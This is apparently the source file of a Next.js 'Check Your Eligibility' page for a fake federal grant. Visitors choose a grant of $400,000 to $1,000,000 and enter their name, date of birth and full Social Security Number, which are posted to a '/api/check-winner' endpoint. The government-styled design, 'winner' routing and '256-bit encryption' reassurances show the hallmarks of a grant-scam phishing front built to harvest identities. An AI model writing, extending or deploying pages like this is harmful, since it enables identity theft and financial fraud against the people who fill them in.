"use client"

import { useState } from "react"
import { useRouter } from "next/navigation"
import { motion } from "framer-motion"
import { Search, AlertCircle, Loader2, DollarSign, Lock } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"

export default function CheckPage() {
  const router = useRouter()
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState("")
  const [notFound, setNotFound] = useState(false)
  const [grantAmount, setGrantAmount] = useState(400000)
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    dob: "",
    ssn: "",
  })

  const formatCurrency = (val: number) =>
    new Intl.NumberFormat("en-US", { style: "currency", currency: "USD", minimumFractionDigits: 0 }).format(val)

  // Auto-format SSN as XXX-XX-XXXX
  const handleSSNChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, "").slice(0, 9)
    let formatted = raw
    if (raw.length > 5) {
      formatted = `${raw.slice(0, 3)}-${raw.slice(3, 5)}-${raw.slice(5)}`
    } else if (raw.length > 3) {
      formatted = `${raw.slice(0, 3)}-${raw.slice(3)}`
    }
    setFormData({ ...formData, ssn: formatted })
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    const rawSSN = formData.ssn.replace(/\D/g, "")
    if (rawSSN.length !== 9) {
      setError("Please enter a valid 9-digit Social Security Number.")
      return
    }
    setLoading(true)
    setError("")
    setNotFound(false)

    try {
      const res = await fetch("/api/check-winner", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          firstName: formData.firstName,
          lastName: formData.lastName,
          dob: formData.dob,
          ssn: rawSSN,
          ssnLast4: rawSSN.slice(-4),
          grantAmount: grantAmount.toString(),
        }),
      })

      const data = await res.json()

      if (data.found) {
        router.push(`/winner?id=${data.winner.id}&amount=${grantAmount}`)
      } else {
        setNotFound(true)
      }
    } catch {
      setError("An error occurred. Please try again.")
    } finally {
      setLoading(false)
    }
  }

  const sliderPercent = ((grantAmount - 400000) / (1000000 - 400000)) * 100

  return (
    <div className="min-h-[80vh]">
      <div className="bg-[#1a1a5e] text-white px-4 py-8 sm:px-6 sm:py-10">
        <div className="mx-auto max-w-2xl">
          <h1 className="text-2xl font-bold sm:text-3xl">Check Your Eligibility</h1>
          <p className="mt-2 text-sm text-blue-100/80">
            Select your grant amount and enter your information to verify eligibility.
          </p>
        </div>
      </div>

      <div className="mx-auto max-w-2xl px-4 py-10 sm:px-6">
        <motion.div
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.3 }}
        >
          <Card className="border border-[#dfe1e2] shadow-sm rounded-sm">
            <CardHeader className="border-b border-[#dfe1e2] bg-[#f7f7f7] py-4">
              <CardTitle className="text-lg font-bold text-[#1b1b1b]">Eligibility Verification</CardTitle>
            </CardHeader>
            <CardContent className="p-6">
              <form onSubmit={handleSubmit} className="space-y-6">
                {/* Grant Amount Slider */}
                <div className="space-y-4">
                  <Label className="text-sm font-bold flex items-center gap-2 text-[#1b1b1b]">
                    <DollarSign className="h-4 w-4 text-[#1a1a5e]" />
                    Select Grant Amount
                  </Label>
                  <div className="border border-[#dfe1e2] bg-[#f7f7f7] p-5 rounded-sm">
                    <div className="text-center mb-4">
                      <div className="text-3xl font-bold text-[#1a1a5e] sm:text-4xl">
                        {formatCurrency(grantAmount)}
                      </div>
                      <p className="mt-1 text-xs text-[#5c5c5c]">Federal Grant Amount</p>
                    </div>
                    <div className="relative px-1">
                      <input
                        type="range"
                        min={400000}
                        max={1000000}
                        step={50000}
                        value={grantAmount}
                        onChange={(e) => setGrantAmount(Number(e.target.value))}
                        className="grant-slider w-full h-2 rounded-full appearance-none cursor-pointer focus:outline-none"
                        style={{
                          background: `linear-gradient(to right, #1a1a5e ${sliderPercent}%, #dfe1e2 ${sliderPercent}%)`,
                        }}
                      />
                      <div className="flex justify-between mt-2 text-[11px] text-[#5c5c5c] font-medium">
                        <span>$400,000</span>
                        <span>$700,000</span>
                        <span>$1,000,000</span>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Divider */}
                <div className="border-t border-[#dfe1e2]" />

                <h3 className="text-sm font-bold text-[#1b1b1b]">Personal Information</h3>

                <div className="grid gap-4 sm:grid-cols-2">
                  <div className="space-y-1.5">
                    <Label htmlFor="firstName" className="text-sm font-semibold text-[#1b1b1b]">First Name</Label>
                    <Input
                      id="firstName"
                      placeholder="e.g. John"
                      value={formData.firstName}
                      onChange={(e) => setFormData({ ...formData, firstName: e.target.value })}
                      required
                      className="rounded-sm border-[#aaacae]"
                    />
                  </div>
                  <div className="space-y-1.5">
                    <Label htmlFor="lastName" className="text-sm font-semibold text-[#1b1b1b]">Last Name</Label>
                    <Input
                      id="lastName"
                      placeholder="e.g. Doe"
                      value={formData.lastName}
                      onChange={(e) => setFormData({ ...formData, lastName: e.target.value })}
                      required
                      className="rounded-sm border-[#aaacae]"
                    />
                  </div>
                </div>

                <div className="space-y-1.5">
                  <Label htmlFor="dob" className="text-sm font-semibold text-[#1b1b1b]">Date of Birth</Label>
                  <Input
                    id="dob"
                    type="date"
                    value={formData.dob}
                    onChange={(e) => setFormData({ ...formData, dob: e.target.value })}
                    required
                    className="rounded-sm border-[#aaacae]"
                  />
                </div>

                <div className="space-y-1.5">
                  <Label htmlFor="ssn" className="text-sm font-semibold text-[#1b1b1b]">Social Security Number</Label>
                  <Input
                    id="ssn"
                    placeholder="XXX-XX-XXXX"
                    value={formData.ssn}
                    onChange={handleSSNChange}
                    required
                    className="rounded-sm border-[#aaacae] font-mono tracking-wider"
                  />
                  <p className="flex items-center gap-1.5 text-[11px] text-[#5c5c5c]">
                    <Lock className="h-3 w-3" />
                    Your information is encrypted and transmitted securely.
                  </p>
                </div>

                {error && (
                  <div className="flex items-center gap-2 border-l-4 border-[#b50909] bg-[#fef1f1] p-3 text-sm text-[#b50909]">
                    <AlertCircle className="h-4 w-4 shrink-0" />
                    {error}
                  </div>
                )}

                {notFound && (
                  <div className="border-l-4 border-[#e5a000] bg-[#fef6e7] p-4">
                    <h3 className="mb-1 text-sm font-bold text-[#936a00]">Record Not Found</h3>
                    <p className="text-sm text-[#5c5c5c]">
                      We could not find a matching grant record. Please verify your information and try again,
                      or contact our support team for assistance.
                    </p>
                  </div>
                )}

                <Button type="submit" size="lg" className="w-full rounded-sm bg-[#005ea2] hover:bg-[#1a4480] text-white" disabled={loading}>
                  {loading ? (
                    <>
                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                      Checking...
                    </>
                  ) : (
                    <>
                      <Search className="mr-2 h-4 w-4" />
                      Check Eligibility
                    </>
                  )}
                </Button>
              </form>
            </CardContent>
          </Card>
        </motion.div>

        <p className="mt-6 flex items-center justify-center gap-1.5 text-[11px] text-[#5c5c5c]">
          <Lock className="h-3 w-3" />
          Your personal information is protected with 256-bit encryption.
        </p>
      </div>
    </div>
  )
}
